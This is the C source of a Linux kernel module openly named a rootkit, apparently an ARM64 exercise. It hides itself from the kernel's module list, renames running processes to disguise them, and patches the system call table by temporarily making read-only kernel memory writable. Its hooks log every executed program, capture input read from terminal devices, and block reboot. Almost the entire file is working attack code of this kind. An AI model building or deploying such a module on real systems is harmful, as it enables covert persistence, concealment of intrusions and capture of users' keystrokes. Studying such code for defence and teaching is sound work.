// SPDX-License-Identifier: GPL-2.0-only
#include <linux/sched.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/sched/signal.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/cdev.h>
#include <asm/syscall.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/unistd.h>
#include <linux/fs_struct.h>
#include <linux/dcache.h>
#include <linux/fdtable.h>

#include "rootkit.h"

#define OURMODNAME	"rootkit"

MODULE_AUTHOR("FOOBAR");
MODULE_DESCRIPTION("FOOBAR");
MODULE_LICENSE("Dual MIT/GPL");
MODULE_VERSION("0.1");

static int major;
struct cdev *kernel_cdev;

/* for Hide and Masquerade */
static struct list_head *module_list_head;

/* for Hook */
static int init_symbols_flag;
static syscall_fn_t org_execve, org_reboot, org_read;
static unsigned long start_rodata, init_begin, rodata_size;
static void (*update_mapping_prot)(phys_addr_t, unsigned long, phys_addr_t,
				   pgprot_t);
static syscall_fn_t *my_sys_call_table;
static int hook_syscalls_flag;

static int rootkit_open(struct inode *inode, struct file *filp)
{

	pr_info("%s\n", __func__);
	return 0;
}

static int rootkit_release(struct inode *inode, struct file *filp)
{
	pr_info("%s\n", __func__);
	return 0;
}

static void rootkit_hide(void)
{
	struct list_head *head;
	struct module *ptr = NULL;

	pr_info("rootkit_hide");
	head = &THIS_MODULE->list;
	if (head->next == head) { /* empty list restore it to list */
		pr_info("restore from list");
		list_add_tail(head, module_list_head);
	} else {
		pr_info("hide from list");
		list_for_each_entry(ptr, head, list) {
			/* pr_info("module list %s\n", ptr->name); */
			if (strlen(ptr->name) == 0)
				module_list_head = &ptr->list;
		}
		__list_del(head->prev, head->next);
		head->next = head;
		head->prev = head;
	}
}

static void rootkit_masq(unsigned long arg)
{
	struct masq_proc_req req;
	struct task_struct *task;
	struct masq_proc *list;
	/* To shrink to the line length to below 80 */
	size_t req_size = sizeof(struct masq_proc_req);
	size_t proc_size = sizeof(struct masq_proc);
	size_t i;

	pr_info("%s\n", __func__);
	if (copy_from_user(&req, (struct masq_proc_req *)arg, req_size)) {
		pr_info("Copy req error");
		return;
	}

	list = kmalloc(req.len * sizeof(struct masq_proc), GFP_KERNEL);

	if (list == NULL)
		return;

	if (copy_from_user(list, req.list, req.len * proc_size)) {
		pr_info("Copy req list error");
		kfree(list);
		return;
	}

	for_each_process(task) {
		/* pr_info("%s PID [%d]\n", task->comm, task->pid); */
		/* Line length needs to below 80 */
		for (i = 0; i < req.len; i++) {
			if (strlen(list[i].new_name) > strlen(list[i].orig_name)
				|| strcmp(task->comm, list[i].orig_name) != 0)
				continue;
			pr_info("Name %s to %s", task->comm, list[i].new_name);
			strcpy(task->comm, list[i].new_name);
		}
	}
	kfree(list);
}

asmlinkage long my_execve(const struct pt_regs *p_regs)
{
	int res;
	const char __user *filename = (const char __user *)p_regs->regs[0];
	char *kfilename = kmalloc(PATH_MAX + 1, GFP_KERNEL);

	if (kfilename == NULL) {
		/* No need to report. See https://lkml.org/lkml/2014/6/10/382 */
		return -1;
	}
	kfilename[PATH_MAX] = '\0';
	res = copy_from_user(kfilename, filename, PATH_MAX);
	if (res > 0) {
		pr_info("bytes not copied: %d\n", res);
		return -1;
	}
	pr_info("exec %s\n", kfilename);
	kfree(kfilename);
	return ((long (*)(const struct pt_regs *))org_execve)(p_regs);
}

asmlinkage long my_read(const struct pt_regs *p_regs)
{

	const int fd = p_regs->regs[0];
	char *kbuf;
	struct files_struct *current_files;
	struct fdtable *file_table;
	struct path files_path;
	char *pwd;

	long ret = ((long (*)(const struct pt_regs *))org_read)(p_regs);
	const char *buf = (const char *)p_regs->regs[1];

	if (fd == 0 && ret) {
		//pr_info("The process is %s %d", current->comm, current->pid);
		current_files = current->files;
		file_table = files_fdtable(current_files);
		kbuf = kmalloc(PATH_MAX, GFP_KERNEL);
		if (kbuf == NULL)
			return -1;

		if (file_table->fd[fd] == NULL)
			return -1;
		files_path = file_table->fd[fd]->f_path;
		pwd = d_path(&files_path, kbuf, PATH_MAX * sizeof(char));
		if (strncmp(pwd, "/dev/", 5) != 0) {
			kfree(kbuf);
			return ret;
		}

		pr_info("Read fd %d from %s", fd, pwd);
		kfree(kbuf);
		kbuf = kmalloc(ret+1, GFP_KERNEL);
		if (kbuf == NULL)
			return -1;

		if (copy_from_user(kbuf, buf, ret)) {
			pr_info("bytes not copied");
			kfree(kbuf);
			return -1;
		}
		pr_info("read from stdin %s", kbuf);
		kfree(kbuf);
	}
	return ret;
}

asmlinkage long my_reboot(const struct pt_regs *unused)
{
	pr_info("please do not reboot\n");
	return 0;
}

static int rootkit_init_symbols(void)
{
	my_sys_call_table = (void *)kallsyms_lookup_name("sys_call_table");
	update_mapping_prot =
		(void *)kallsyms_lookup_name("update_mapping_prot");
	start_rodata = (unsigned long)kallsyms_lookup_name("__start_rodata");
	init_begin = (unsigned long)kallsyms_lookup_name("__init_begin");
	rodata_size = init_begin - start_rodata;

	return !my_sys_call_table || !update_mapping_prot || !start_rodata ||
	       !init_begin;
}

static void rootkit_hook(void)
{
	if (hook_syscalls_flag)
		return;

	if (!init_symbols_flag) {
		int res = rootkit_init_symbols();

		if (res) {
			pr_info("failed to get symbols\n");
			return;
		}
		init_symbols_flag = 1;
	}

	org_execve = my_sys_call_table[__NR_execve];
	org_reboot = my_sys_call_table[__NR_reboot];
	org_read = my_sys_call_table[__NR_read];

	/* No return for update_mapping_prot. No need to check. */
	update_mapping_prot(__pa_symbol(start_rodata),
			    (unsigned long)start_rodata, rodata_size,
			    PAGE_KERNEL);
	my_sys_call_table[__NR_execve] = (syscall_fn_t)my_execve;
	my_sys_call_table[__NR_reboot] = (syscall_fn_t)my_reboot;
	my_sys_call_table[__NR_read] = (syscall_fn_t)my_read;
	update_mapping_prot(__pa_symbol(start_rodata),
			    (unsigned long)start_rodata, rodata_size,
			    PAGE_KERNEL_RO);

	hook_syscalls_flag = 1;
}

static void rootkit_unhook(void)
{
	if (!hook_syscalls_flag)
		return;
	update_mapping_prot(__pa_symbol(start_rodata),
			    (unsigned long)start_rodata, rodata_size,
			    PAGE_KERNEL);
	my_sys_call_table[__NR_execve] = org_execve;
	my_sys_call_table[__NR_reboot] = org_reboot;
	my_sys_call_table[__NR_read] = org_read;
	update_mapping_prot(__pa_symbol(start_rodata),
			    (unsigned long)start_rodata, rodata_size,
			    PAGE_KERNEL_RO);
	hook_syscalls_flag = 0;
}

static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
		unsigned long arg)
{
	int ret = 0;

	pr_info("%s\n", __func__);
	switch (ioctl) {
	case IOCTL_MOD_HOOK:
		rootkit_hook();
		break;
	case IOCTL_MOD_HIDE:
		rootkit_hide();
		break;
	case IOCTL_MOD_MASQ:
		rootkit_masq(arg);
		break;
	default:
		ret = -EINVAL;
	}
	return ret;
}

static const struct file_operations fops = {
	.open		= rootkit_open,
	.unlocked_ioctl	= rootkit_ioctl,
	.release	= rootkit_release,
	.owner		= THIS_MODULE
};

static int __init rootkit_init(void)
{
	int ret;
	dev_t dev_no, dev;

	kernel_cdev = cdev_alloc();
	kernel_cdev->ops = &fops;
	kernel_cdev->owner = THIS_MODULE;

	ret = alloc_chrdev_region(&dev_no, 0, 1, "rootkit");
	if (ret < 0) {
		pr_info("major number allocation failed\n");
		return ret;
	}

	major = MAJOR(dev_no);
	dev = MKDEV(major, 0);
	pr_info("The major number for your device is %d\n", major);
	ret = cdev_add(kernel_cdev, dev, 1);
	if (ret < 0) {
		pr_info("unable to allocate cdev");
		return ret;
	}

	return 0;
}


static void __exit rootkit_exit(void)
{
	// TODO: unhook syscall
	rootkit_unhook();

	pr_info("%s: removed\n", OURMODNAME);
	cdev_del(kernel_cdev);
	unregister_chrdev_region(major, 1);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
